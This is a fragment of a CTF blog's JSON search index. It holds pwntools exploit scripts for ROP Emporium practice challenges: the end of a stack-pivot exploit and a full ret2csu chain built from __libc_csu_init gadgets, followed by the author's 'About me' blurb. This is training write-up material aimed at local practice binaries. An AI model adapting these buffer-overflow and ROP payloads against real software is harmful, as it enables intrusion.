\u0026#34;A\u0026#34; * 0x28 payload2 += pop_rax payload2 += heap_addr payload2 += xchg_rax_rsp print \u0026#34;Sending payload2: \u0026#34;, payload2.encode(\u0026#34;hex\u0026#34;) p.sendline(payload2) print p.recvuntil(\u0026#34;.so\u0026#34;) foothold_ptr = u64(p.recv(6) + \u0026#34;\\x00\\x00\u0026#34;) print \u0026#34;foothold_ptr = \u0026#34;, hex(foothold_ptr) win_ptr = p64(foothold_ptr + 0x14e) payload3 = \u0026#34;A\u0026#34; * 0x28 payload3 += win_ptr print \u0026#34;GET READY WE ARE GOING IN AGAIN\u0026#34; print p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) print \u0026#34;sending payload3 once: \u0026#34;, payload3.encode(\u0026#34;hex\u0026#34;) p.sendline(payload3) print p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) print \u0026#34;Sending payload3: \u0026#34;, payload3.encode(\u0026#34;hex\u0026#34;) p.sendline(payload3) p.interactive() Challenge 08: ret2csu Exploit code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 from pwn import * # Establish the process p = process(\u0026#39;./ret2csu\u0026#39;) #gdb.attach(p, gdbscript = \u0026#39;b * 0x4007b0\u0026#39;) # Our two __libc_csu_init rop gadgets csuGadget0 = p64(0x40089a) csuGadget1 = p64(0x400880) # Address of ret2win and _init pointer ret2win = p64(0x4007b1) initPtr = p64(0x600e38) # Padding from start of input to saved return address payload = \u0026#34;0\u0026#34;*0x28 # Our first gadget, and the values to be popped from the stack # Also a value of 0xf means it is a filler value payload += csuGadget0 payload += p64(0x0) # RBX payload += p64(0x1) # RBP payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]` payload += p64(0xf) # R13 payload += p64(0xf) # R14 payload += p64(0xdeadcafebabebeef) # R15 \u0026gt; soon to be RDX # Our second gadget, and the corresponding stack values payload += csuGadget1 payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment payload += p64(0xf) # RBX payload += p64(0xf) # RBP payload += p64(0xf) # R12 payload += p64(0xf) # R13 payload += p64(0xf) # R14 payload += p64(0xf) # R15 # Finally the address of ret2win payload += ret2win # Send the payload p.sendline(payload) p.interactive() ","description":"Practice pwn technique ROP","id":21,"section":"posts","tags":["Training","pwn","rop","writeups"],"title":"Trainning ROP EMPORIUM","uri":"https://duythucne22.github.io/posts/rop-emporium/"},{"content":"Hi, my name is DuyThuc aka f4ngyu4n 🙉, since we need to protect our information from this dangerous world 😈.\nI’m interested in learning and solving security related issues then enjoying CTF - Binary/Reverse. By asking questions you will start to learn somethings, most of my knowledge learn from searching and asking other people too 😀.\nThis blog will be the place to share my journey to learn and play CTF. If you’re interested you can dm me via social media 💬 .\n","description":"Keep climbing up, to see the world in different perspectives","id":22,"section":"","tags":null,"title":"About me","uri":"https://duythucne22.github.io/about/"}]